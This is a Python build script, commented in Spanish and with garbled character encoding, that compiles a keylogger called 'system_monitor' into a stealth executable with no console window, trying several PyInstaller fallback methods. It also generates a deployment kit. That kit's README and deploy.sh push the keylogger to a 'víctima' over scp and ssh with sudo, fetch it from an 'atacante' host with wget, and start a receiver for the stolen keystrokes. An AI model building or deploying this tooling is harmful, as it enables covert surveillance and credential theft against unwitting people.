#!/usr/bin/env python3
"""
build_keylogger_ultimate.py - Compilador Avanzado de Keylogger
M√©todo definitivo con m√∫ltiples fallbacks para resolver problemas de dependencias
Especialmente dise√±ado para resolver problemas con pynput en PyInstaller
"""

import os
import sys
import subprocess
import shutil
import platform
import datetime

def print_banner():
    """Mostrar banner del compilador"""
    print("üõ†Ô∏è  COMPILADOR ULTIMATE DE KEYLOGGER")
    print("=" * 50)
    print("üéØ Objetivo: Crear ejecutable standalone")
    print("üîß M√©todo: M√∫ltiples t√©cnicas avanzadas")
    print("üí° Soluciona: Problemas de dependencias complejas")
    print("=" * 50)

def check_dependencies():
    """Verificar que todas las dependencias est√©n disponibles"""
    print("üîç Verificando dependencias...")
    
    # Verificar archivos necesarios
    required_files = ["system_monitor.py", "reconstructor.py"]
    for file in required_files:
        if not os.path.exists(file):
            print(f"‚ùå Archivo requerido no encontrado: {file}")
            return False
        print(f"‚úÖ {file}")
    
    # Verificar Python modules
    required_modules = ["pynput", "requests"]
    for module in required_modules:
        try:
            __import__(module)
            print(f"‚úÖ {module}")
        except ImportError:
            print(f"‚ùå M√≥dulo {module} no encontrado")
            print(f"   Instala con: pip install {module}")
            return False
    
    return True

def install_pyinstaller():
    """Instalar PyInstaller con m√∫ltiples m√©todos"""
    print("üîß Verificando/Instalando PyInstaller...")
    
    # Verificar si ya est√° instalado
    try:
        import PyInstaller
        print("‚úÖ PyInstaller ya disponible")
        return True
    except ImportError:
        pass
    
    # M√©todo 1: pip install con --break-system-packages
    methods = [
        [sys.executable, "-m", "pip", "install", "pyinstaller", "--break-system-packages"],
        [sys.executable, "-m", "pip", "install", "pyinstaller"],
        ["sudo", "apt", "install", "-y", "python3-pyinstaller"],
        ["apt", "install", "-y", "python3-pyinstaller"]
    ]
    
    for i, cmd in enumerate(methods, 1):
        try:
            print(f"‚ö° M√©todo {i}: {' '.join(cmd[:3])}...")
            subprocess.run(cmd, check=True, capture_output=True)
            print("‚úÖ PyInstaller instalado")
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            continue
    
    print("‚ùå No se pudo instalar PyInstaller autom√°ticamente")
    print("üí° Intenta manualmente:")
    print("   sudo apt install python3-pyinstaller")
    print("   o")
    print("   pip install pyinstaller --break-system-packages")
    return False

def create_advanced_spec():
    """Crear archivo .spec ultra-avanzado para resolver todos los problemas"""
    spec_content = '''# -*- mode: python ; coding: utf-8 -*-
# Ultra Advanced .spec file - Keylogger System Monitor
# Soluciona TODOS los problemas de dependencias conocidos

import os
import sys
from PyInstaller.building.build_main import Analysis, PYZ, EXE
from PyInstaller.utils.hooks import collect_all, collect_data_files, collect_dynamic_libs

# ==========================================
# RECOLECCI√ìN EXHAUSTIVA DE DEPENDENCIAS
# ==========================================

print("üîç Recolectando dependencias de pynput...")
pynput_datas, pynput_binaries, pynput_hiddenimports = collect_all('pynput')

print("üîç Recolectando dependencias de requests...")
requests_datas, requests_binaries, requests_hiddenimports = collect_all('requests')

print("üîç Recolectando dependencias de urllib3...")
urllib3_datas, urllib3_binaries, urllib3_hiddenimports = collect_all('urllib3')

print("üîç Recolectando dependencias de certifi...")
certifi_datas, certifi_binaries, certifi_hiddenimports = collect_all('certifi')

# Combinar todas las dependencias autom√°ticas
all_datas = (pynput_datas + requests_datas + urllib3_datas + certifi_datas + 
             [('reconstructor.py', '.')])

all_binaries = pynput_binaries + requests_binaries + urllib3_binaries + certifi_binaries

# Lista EXHAUSTIVA de imports ocultos
all_hiddenimports = list(set(
    pynput_hiddenimports + requests_hiddenimports + 
    urllib3_hiddenimports + certifi_hiddenimports + [
        # pynput core
        'pynput',
        'pynput.keyboard',
        'pynput.mouse',
        'pynput._util',
        # pynput backends
        'pynput.keyboard._base',
        'pynput.keyboard._xorg',
        'pynput.keyboard._win32', 
        'pynput.keyboard._darwin',
        'pynput.mouse._base',
        'pynput.mouse._xorg',
        'pynput.mouse._win32',
        'pynput.mouse._darwin',
        # pynput utils por plataforma
        'pynput._util.linux',
        'pynput._util.darwin', 
        'pynput._util.win32',
        'pynput._util.xorg',
        # X11 dependencies (Linux)
        'Xlib',
        'Xlib.display',
        'Xlib.X',
        'Xlib.protocol',
        'Xlib.protocol.request',
        'Xlib.protocol.display',
        'Xlib.ext',
        'Xlib.ext.record',
        'Xlib.ext.randr',
        # evdev (Linux input)
        'evdev',
        'evdev.device',
        'evdev.events',
        'evdev.ecodes',
        # requests y urllib3 completo
        'requests',
        'requests.models',
        'requests.api',
        'requests.sessions',
        'requests.adapters',
        'requests.auth',
        'requests.cookies',
        'requests.packages',
        'requests.packages.urllib3',
        'requests.packages.urllib3.contrib',
        'requests.packages.urllib3.util',
        'urllib3',
        'urllib3.connection',
        'urllib3.connectionpool',
        'urllib3.util',
        'urllib3.util.connection',
        'urllib3.util.retry',
        'urllib3.util.ssl_',
        'urllib3.contrib',
        'urllib3.contrib.socks',
        # certificados SSL
        'certifi',
        'charset_normalizer',
        'idna',
        # m√≥dulos est√°ndar cr√≠ticos
        'base64',
        'hashlib',
        'threading',
        'time',
        'os',
        'sys',
        'json',
        'datetime',
        'socket',
        'ssl',
        'select',
        'signal',
        'struct',
        'ctypes',
        'ctypes.util',
        # reconstructor custom
        'reconstructor'
    ]
))

print(f"üìä Datos recolectados: {len(all_datas)} archivos")
print(f"üìä Binarios recolectados: {len(all_binaries)} archivos")  
print(f"üìä Imports ocultos: {len(all_hiddenimports)} m√≥dulos")

# ==========================================
# CONFIGURACI√ìN DE AN√ÅLISIS
# ==========================================

a = Analysis(
    ['system_monitor.py'],
    pathex=['.'],
    binaries=all_binaries,
    datas=all_datas,
    hiddenimports=all_hiddenimports,
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[
        # Excluir m√≥dulos innecesarios para reducir tama√±o
        'tkinter',
        'matplotlib',
        'numpy',
        'pandas',
        'scipy',
        'PIL',
        'win32api',
        'win32con',
        'win32gui'
    ],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=None,
    noarchive=False,
)

# ==========================================
# CONFIGURACI√ìN DE EJECUTABLE
# ==========================================

pyz = PYZ(a.pure, a.zipped_data, cipher=None)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='system_monitor',
    debug=False,                    # Sin debug para producci√≥n
    bootloader_ignore_signals=False,
    strip=False,                    # No strip para compatibilidad
    upx=True,                      # Comprimir con UPX si est√° disponible
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,                  # SIN consola (stealth mode)
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=None
)

print("‚úÖ Configuraci√≥n .spec completada")
'''
    
    with open("system_monitor_ultimate.spec", "w") as f:
        f.write(spec_content)
    
    print("‚úÖ Archivo .spec ultra-avanzado creado: system_monitor_ultimate.spec")
    return True

def build_method_1_ultimate_spec():
    """M√©todo 1: Compilaci√≥n con .spec ultra-avanzado"""
    print("\nüéØ M√âTODO 1: Archivo .spec ultra-avanzado")
    print("-" * 40)
    
    try:
        # Crear archivo .spec ultra-avanzado
        create_advanced_spec()
        
        # Compilar usando el archivo .spec
        cmd = [sys.executable, "-m", "PyInstaller", "system_monitor_ultimate.spec", "--clean"]
        
        print("üíª Ejecutando PyInstaller con .spec ultra-avanzado...")
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        
        executable_path = "dist/system_monitor"
        if os.path.exists(executable_path):
            os.chmod(executable_path, 0o755)
            size = os.path.getsize(executable_path)
            size_mb = size / (1024 * 1024)
            
            print("‚úÖ ¬°√âXITO! M√©todo .spec ultra-avanzado")
            print(f"üìÇ Ejecutable: {executable_path}")
            print(f"üìè Tama√±o: {size_mb:.1f} MB")
            print("üéØ M√©todo: .spec ultra-avanzado (m√°xima compatibilidad)")
            print("üîí Modo: Sin consola (stealth)")
            
            return True, executable_path
            
    except subprocess.CalledProcessError as e:
        print("‚ö†Ô∏è  M√©todo .spec ultra-avanzado fall√≥")
        if e.stderr:
            print(f"   Error: {e.stderr[:200]}...")
        
    return False, None

def build_method_2_collect_all():
    """M√©todo 2: Comando directo con --collect-all agresivo"""
    print("\nüéØ M√âTODO 2: --collect-all agresivo")
    print("-" * 40)
    
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--name=system_monitor",
        "--add-data=reconstructor.py:.",
        # Recolectar TODO de las librer√≠as problem√°ticas
        "--collect-all=pynput",
        "--collect-all=requests", 
        "--collect-all=urllib3",
        "--collect-all=certifi",
        "--collect-all=charset_normalizer",
        "--collect-all=idna",
        "--collect-all=Xlib",
        "--collect-all=evdev",
        # Imports cr√≠ticos espec√≠ficos
        "--hidden-import=pynput.keyboard._xorg",
        "--hidden-import=pynput.mouse._xorg",  
        "--hidden-import=pynput._util.linux",
        "--hidden-import=pynput._util.xorg",
        "--hidden-import=Xlib.display",
        "--hidden-import=evdev.device",
        "--hidden-import=urllib3.util.retry",
        "--hidden-import=requests.packages.urllib3",
        "--hidden-import=reconstructor",
        # Configuraci√≥n de compilaci√≥n
        "--noconsole",  # Sin consola para stealth
        "--clean",
        "system_monitor.py"
    ]
    
    try:
        print("üíª Ejecutando PyInstaller con --collect-all agresivo...")
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        
        executable_path = "dist/system_monitor"
        if os.path.exists(executable_path):
            os.chmod(executable_path, 0o755)
            size = os.path.getsize(executable_path)
            size_mb = size / (1024 * 1024)
            
            print("‚úÖ ¬°√âXITO! M√©todo --collect-all agresivo")
            print(f"üìÇ Ejecutable: {executable_path}")
            print(f"üìè Tama√±o: {size_mb:.1f} MB")
            print("üéØ M√©todo: --collect-all agresivo")
            print("üîí Modo: Sin consola (stealth)")
            
            return True, executable_path
        
    except subprocess.CalledProcessError as e:
        print("‚ö†Ô∏è  M√©todo --collect-all agresivo fall√≥")
        if e.stderr:
            print(f"   Error: {e.stderr[:200]}...")
    
    return False, None

def build_method_3_console_debug():
    """M√©todo 3: Compilaci√≥n con consola para debug"""
    print("\nüéØ M√âTODO 3: Con consola para debug")
    print("-" * 40)
    
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--name=system_monitor_debug",
        "--add-data=reconstructor.py:.",
        "--collect-all=pynput",
        "--collect-all=requests", 
        "--hidden-import=pynput.keyboard._xorg",
        "--hidden-import=pynput.mouse._xorg",  
        "--hidden-import=pynput._util.linux",
        "--hidden-import=reconstructor",
        "--console",  # CON consola para ver errores
        "--clean",
        "system_monitor.py"
    ]
    
    try:
        print("üíª Ejecutando PyInstaller con consola debug...")
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        
        executable_path = "dist/system_monitor_debug"
        if os.path.exists(executable_path):
            os.chmod(executable_path, 0o755)
            size = os.path.getsize(executable_path)
            size_mb = size / (1024 * 1024)
            
            print("‚úÖ ¬°√âXITO! M√©todo con consola debug")
            print(f"üìÇ Ejecutable: {executable_path}")
            print(f"üìè Tama√±o: {size_mb:.1f} MB")
            print("üéØ M√©todo: Con consola para debug")
            print("‚ö†Ô∏è  Nota: Incluye consola para debugging")
            
            return True, executable_path
        
    except subprocess.CalledProcessError as e:
        print("‚ö†Ô∏è  M√©todo con consola debug fall√≥")
        if e.stderr:
            print(f"   Error: {e.stderr[:200]}...")
    
    return False, None

def build_method_4_minimal():
    """M√©todo 4: Ejecutable m√≠nimo (requiere deps en destino)"""
    print("\nüéØ M√âTODO 4: Ejecutable m√≠nimo")
    print("-" * 40)
    
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--name=system_monitor_minimal",
        "--add-data=reconstructor.py:.",
        "--noconsole",
        "--clean",
        "system_monitor.py"
    ]
    
    try:
        print("üíª Ejecutando PyInstaller minimal...")
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        
        executable_path = "dist/system_monitor_minimal"
        if os.path.exists(executable_path):
            os.chmod(executable_path, 0o755)
            size = os.path.getsize(executable_path)
            size_mb = size / (1024 * 1024)
            
            print("‚úÖ ¬°√âXITO! M√©todo m√≠nimo")
            print(f"üìÇ Ejecutable: {executable_path}")
            print(f"üìè Tama√±o: {size_mb:.1f} MB")
            print("üéØ M√©todo: M√≠nimo (requiere deps en destino)")
            print("‚ö†Ô∏è  NOTA: Requiere pynput y requests en sistema destino")
            
            return True, executable_path
        
    except subprocess.CalledProcessError as e:
        print("‚ö†Ô∏è  M√©todo m√≠nimo fall√≥")
        if e.stderr:
            print(f"   Error: {e.stderr[:200]}...")
    
    return False, None

def test_executable(executable_path):
    """Probar que el ejecutable funciona b√°sicamente"""
    print(f"\nüß™ Probando ejecutable: {executable_path}")
    print("-" * 40)
    
    if not os.path.exists(executable_path):
        print("‚ùå Ejecutable no encontrado")
        return False
    
    # Test b√°sico: verificar que se puede ejecutar
    try:
        # Ejecutar por 2 segundos para ver si inicia sin errores
        process = subprocess.Popen([executable_path], 
                                 stdout=subprocess.PIPE, 
                                 stderr=subprocess.PIPE)
        
        # Esperar un poco y luego terminar
        import time
        time.sleep(2)
        process.terminate()
        
        stdout, stderr = process.communicate(timeout=5)
        
        print("‚úÖ Ejecutable se inicia correctamente")
        if stderr:
            print(f"‚ö†Ô∏è  Stderr: {stderr.decode()[:200]}...")
        
        return True
        
    except Exception as e:
        print(f"‚ùå Error al probar ejecutable: {e}")
        return False

def create_deployment_package(successful_executables):
    """Crear paquete de despliegue con todos los ejecutables exitosos"""
    print("\nüì¶ Creando paquete de despliegue...")
    print("-" * 40)
    
    if not successful_executables:
        print("‚ùå No hay ejecutables exitosos para empaquetar")
        return
    
    # Crear directorio de despliegue
    deploy_dir = "keylogger_deployment"
    if os.path.exists(deploy_dir):
        shutil.rmtree(deploy_dir)
    os.makedirs(deploy_dir)
    
    # Copiar ejecutables exitosos
    for name, path in successful_executables:
        dest_path = os.path.join(deploy_dir, os.path.basename(path))
        shutil.copy2(path, dest_path)
        print(f"‚úÖ Copiado: {name}")
    
    # Crear archivo README de despliegue
    readme_content = f'''# PAQUETE DE DESPLIEGUE KEYLOGGER
Generated on: {datetime.datetime.now()}

## EJECUTABLES INCLUIDOS:
'''
    
    for name, path in successful_executables:
        size = os.path.getsize(path) / (1024 * 1024)
        readme_content += f"\n- {os.path.basename(path)} ({size:.1f} MB) - {name}"
    
    readme_content += '''

## INSTRUCCIONES DE USO:

### 1. DESPLIEGUE EN V√çCTIMA:
```bash
# Transferir ejecutable
scp system_monitor* usuario@victima:/tmp/

# Ejecutar en v√≠ctima
ssh usuario@victima 'chmod +x /tmp/system_monitor* && sudo /tmp/system_monitor*'
```

### 2. DESPLIEGUE V√çA WEB:
```bash
# Servir archivos v√≠a HTTP
python3 -m http.server 8000

# En v√≠ctima (navegador):
http://atacante:8000 -> Descargar ejecutable

# En v√≠ctima (terminal):
wget http://atacante:8000/keylogger_deployment/system_monitor
chmod +x system_monitor && sudo ./system_monitor
```

### 3. RECEPCI√ìN DE DATOS:
```bash
# En m√°quina atacante
python3 data_receiver.py
```

## NOTAS DE COMPATIBILIDAD:
- system_monitor: Standalone completo (recomendado)
- system_monitor_debug: Con consola para debugging
- system_monitor_minimal: Requiere deps en destino
'''
    
    with open(os.path.join(deploy_dir, "README.md"), "w") as f:
        f.write(readme_content)
    
    # Crear script de despliegue autom√°tico
    deploy_script = f'''#!/bin/bash
# Script de despliegue autom√°tico

echo "üöÄ DESPLIEGUE AUTOM√ÅTICO KEYLOGGER"
echo "================================="

# Verificar conexi√≥n con v√≠ctima
read -p "IP de v√≠ctima: " VICTIM_IP
read -p "Usuario v√≠ctima: " VICTIM_USER

echo "üì° Transfiriendo ejecutable..."
scp system_monitor $VICTIM_USER@$VICTIM_IP:/tmp/

echo "üîß Configurando permisos y ejecutando..."
ssh $VICTIM_USER@$VICTIM_IP 'chmod +x /tmp/system_monitor && sudo /tmp/system_monitor &'

echo "‚úÖ Keylogger desplegado"
echo "üí° Inicia receptor con: python3 data_receiver.py"
'''
    
    with open(os.path.join(deploy_dir, "deploy.sh"), "w") as f:
        f.write(deploy_script)
    os.chmod(os.path.join(deploy_dir, "deploy.sh"), 0o755)
    
    print(f"‚úÖ Paquete creado en: {deploy_dir}/")
    print(f"üìÅ Archivos incluidos: {len(successful_executables)} ejecutables + scripts")

def main():
    """Funci√≥n principal del compilador ultimate"""
    
    print_banner()
    
    # Verificar dependencias
    if not check_dependencies():
        print("\n‚ùå Dependencias faltantes. Ejecuta primero:")
        print("   pip install pynput requests")
        return
    
    # Instalar PyInstaller
    if not install_pyinstaller():
        return
    
    # Limpiar compilaciones anteriores
    print("\nüßπ Limpiando compilaciones anteriores...")
    for dir_name in ["dist", "build"]:
        if os.path.exists(dir_name):
            shutil.rmtree(dir_name)
    
    for spec_file in ["system_monitor.spec", "system_monitor_ultimate.spec"]:
        if os.path.exists(spec_file):
            os.remove(spec_file)
    
    # Intentar m√∫ltiples m√©todos de compilaci√≥n
    print("\nüöÄ INICIANDO COMPILACI√ìN CON M√öLTIPLES M√âTODOS...")
    print("=" * 60)
    
    successful_builds = []
    
    # M√©todo 1: .spec ultra-avanzado
    success, path = build_method_1_ultimate_spec()
    if success:
        successful_builds.append(("Ultra-Advanced .spec", path))
        if test_executable(path):
            print("üéØ ¬°M√âTODO √ìPTIMO ENCONTRADO! Usando .spec ultra-avanzado")
    
    # M√©todo 2: --collect-all agresivo
    success, path = build_method_2_collect_all()
    if success:
        successful_builds.append(("Collect-All Agresivo", path))
        if test_executable(path):
            print("üéØ M√©todo alternativo funcional: --collect-all agresivo")
    
    # M√©todo 3: Con consola para debug
    success, path = build_method_3_console_debug()
    if success:
        successful_builds.append(("Con Consola Debug", path))
        if test_executable(path):
            print("üéØ M√©todo debug funcional: con consola")
    
    # M√©todo 4: M√≠nimo
    success, path = build_method_4_minimal()
    if success:
        successful_builds.append(("M√≠nimo", path))
        if test_executable(path):
            print("üéØ M√©todo m√≠nimo funcional: requiere deps")
    
    # Mostrar resultados
    print("\n" + "=" * 60)
    print("üìä RESUMEN DE COMPILACI√ìN")
    print("=" * 60)
    
    if successful_builds:
        print(f"‚úÖ M√©todos exitosos: {len(successful_builds)}")
        
        for name, path in successful_builds:
            size = os.path.getsize(path) / (1024 * 1024)
            print(f"   üìÇ {name}: {path} ({size:.1f} MB)")
        
        # Crear paquete de despliegue
        create_deployment_package(successful_builds)
        
        print("\nüéØ RECOMENDACIONES:")
        if any("Ultra-Advanced" in name for name, _ in successful_builds):
            print("   üèÜ USAR: system_monitor (m√©todo .spec ultra-avanzado)")
            print("       ‚Üí M√°xima compatibilidad y modo stealth")
        elif any("Agresivo" in name for name, _ in successful_builds):
            print("   ü•à USAR: system_monitor (m√©todo --collect-all)")
            print("       ‚Üí Buena compatibilidad y modo stealth")
        elif any("Debug" in name for name, _ in successful_builds):
            print("   ü•â USAR: system_monitor_debug (con consola)")
            print("       ‚Üí Para debugging, muestra errores")
        
        print("\nüìã PR√ìXIMOS PASOS:")
        print("1. Probar ejecutable en m√°quina v√≠ctima")
        print("2. Iniciar receptor: python3 data_receiver.py")
        print("3. Usar interfaz web: python3 -m http.server 8000")
        
    else:
        print("‚ùå NING√öN M√âTODO EXITOSO")
        print("\nüí° ALTERNATIVAS:")
        print("1. Usar instalaci√≥n autom√°tica: auto_setup.sh")
        print("2. Instalaci√≥n manual en v√≠ctima:")
        print("   pip install pynput requests")
        print("   python3 system_monitor.py")
        print("\nüîç DIAGN√ìSTICO:")
        print("- Verificar que pynput funciona: python3 -c 'import pynput; print(\"OK\")'")
        print("- Instalar deps sistema: sudo apt install python3-tk python3-dev")
        print("- Usar Parrot/Kali con deps preinstaladas")

if __name__ == "__main__":
    main()
